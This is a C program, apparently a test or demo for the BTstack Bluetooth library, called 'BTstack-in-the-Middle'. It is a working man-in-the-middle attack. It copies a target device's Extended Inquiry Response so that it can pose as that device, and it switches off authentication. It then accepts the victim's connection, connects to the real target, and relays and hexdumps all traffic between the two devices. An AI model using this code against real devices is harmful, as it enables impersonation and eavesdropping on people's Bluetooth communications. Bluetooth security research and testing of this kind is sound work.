/*
 *  test.c
 * 
 *  Created by Matthias Ringwald on 7/14/09.
 */

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <strings.h>

#include "../src/btstack.h"
#include "../src/run_loop.h"
#include "../src/hci.h"

#define EIR_LEN 240

bd_addr_t addr;
bd_addr_t temp_addr;

uint8_t   got_EIR = 0;
uint8_t   bob_EIR[EIR_LEN];
hci_con_handle_t bob_handle  = 0;
hci_con_handle_t alice_handle = 0;
uint16_t clock_offset;
uint8_t  page_scan_repetition_mode;
uint8_t  inquiry_done = 0;
hci_con_handle_t con_handle;
uint16_t source_cid_interrupt;
uint16_t source_cid_control;

void data_handler(uint8_t *packet, uint16_t size){
	hci_con_handle_t in = READ_ACL_CONNECTION_HANDLE(packet);
	hci_con_handle_t out = 0;
	if (in == alice_handle) {
		printf("Alice: ");
		hexdump( packet, size );
		printf("\n\n");
		out = bob_handle;
	}
	if (in == bob_handle) {
		printf("Bob: ");
		hexdump( packet, size );
		printf("\n\n");
		out = alice_handle;
	}
	if (out){
        bt_store_16( packet, 0, (READ_BT_16(packet, 0) & 0xf000) | out);
        bt_send_acl_packet(packet, size);
    }
	
}

void event_handler(uint8_t *packet, uint16_t size){
	
    // bt stack activated, get started - set local name
    if (packet[0] == HCI_EVENT_BTSTACK_WORKING ||
	   (packet[0] == HCI_EVENT_BTSTACK_STATE && packet[2] == HCI_STATE_WORKING)) {
        bt_send_cmd(&hci_write_local_name, "BTstack-in-the-Middle");
    }
    
	// use pairing yes/no
    if ( COMMAND_COMPLETE_EVENT(packet, hci_write_local_name) ) {
        bt_send_cmd(&hci_write_authentication_enable, 0);
    }
	
	// allow Extended Inquiry responses
    if ( COMMAND_COMPLETE_EVENT(packet, hci_write_authentication_enable) ) {
        bt_send_cmd(&hci_write_inquiry_mode, 2);
    }
		
	// get all events, including EIRs
	if ( COMMAND_COMPLETE_EVENT(packet, hci_write_inquiry_mode) ) {
        bt_send_cmd(&hci_set_event_mask, 0xffffffff, 0x1fffffff);
    }
	
		
	// start inquiry
	if ( COMMAND_COMPLETE_EVENT(packet, hci_set_event_mask) ) {
		// enable capure
		bt_send_cmd(&btstack_set_acl_capture_mode, 1);
		
		printf("Starting inquiry to get EIR from BOB\n");
		bt_send_cmd(&hci_inquiry, HCI_INQUIRY_LAP, 15, 0);
	}
	
	// process EIR responses
	if (packet[0] == HCI_EVENT_EXTENDED_INQUIRY_RESPONSE && packet[17] && !got_EIR) {
		printf("Got EIR from BOB\n");
		memcpy(bob_EIR, &packet[17], EIR_LEN);
		got_EIR = 1;
		clock_offset = READ_BT_16(packet, 14);
		page_scan_repetition_mode = packet[9];
		// stop inquiry
		bt_send_cmd(&hci_inquiry_cancel);
	}
	
	// Inquiry done, set EIR
	if (packet[0] == HCI_EVENT_INQUIRY_COMPLETE || COMMAND_COMPLETE_EVENT(packet, hci_inquiry_cancel)){
		if (!inquiry_done){
			inquiry_done = 1;
			printf("Inquiry Complete, got EIR %u\n", got_EIR);
			if (got_EIR){
				printf("Set own EIR to Bob's.\n");
				bt_send_cmd(&hci_write_extended_inquiry_response, 0, bob_EIR);			
			}
		}
	}
	
	// Connect to BOB
	if ( COMMAND_COMPLETE_EVENT(packet, hci_write_extended_inquiry_response) ) {
		printf("Now start Alice!...\n");
		// bt_send_cmd(&hci_create_connection, &addr, 0x18, page_scan_repetition_mode, 0, 0x8000 || clock_offset, 0);
	}

	// accept incoming connections
	if (packet[0] == HCI_EVENT_CONNECTION_REQUEST){
		printf("Connection request from ");
		bt_flip_addr(temp_addr, &packet[2]); 
		print_bd_addr(temp_addr);
		printf("\n");
		bt_send_cmd(&hci_accept_connection_request, &temp_addr, 1);
	}
	
	// handle connections
    if (packet[0] == HCI_EVENT_CONNECTION_COMPLETE) {
		if (packet[2] == 0){
			if (!alice_handle) {
				alice_handle = READ_BT_16(packet, 3);
				printf("Alice connected (handle %u). Connecting BOB!\n", alice_handle);
				bt_send_cmd(&hci_create_connection, &addr, 0x18, page_scan_repetition_mode, 0, 0x8000 || clock_offset, 0);
			} else {
				bob_handle = READ_BT_16(packet, 3);
				printf("Connected to BOB (handle %u). Relayaing data!\n", bob_handle);
			}
		} else {
			printf("Connection complete status %u\n", packet[2]);
		}
	}
	
	
	// inform about pin code request
	if (packet[0] == HCI_EVENT_PIN_CODE_REQUEST){
		printf("Please enter PIN 1234 on remote device\n");
	}
		
	// connection closed -> quit tes app
	if (packet[0] == HCI_EVENT_DISCONNECTION_COMPLETE) {
		printf("Basebank connection closed, exit.\n");
		exit(0);
	}
}

int main (int argc, const char * argv[]){
	// parse addr of Bob
	uint8_t ok = 0;
	if (argc >= 2) {
		ok = sscan_bd_addr((uint8_t *) argv[1], addr);
	} 
	if (!ok) {
		printf("Usage: mitm 12:34:56:78:9A:BC\n");
		exit(0);
	}
	
	// start stack
	int err = bt_open();
	if (err) {
		printf("Failed to open connection to BTdaemon\n");
		return err;
	}
	
	printf("BTstack-in-the-Middle started, will pretend to be BOB (");
	print_bd_addr(addr);
	printf(")\n");
	
	bt_register_event_packet_handler(event_handler);
	bt_register_data_packet_handler(data_handler);
	bt_send_cmd(&btstack_set_power_mode, HCI_POWER_ON );
	run_loop_execute();
	bt_close();
}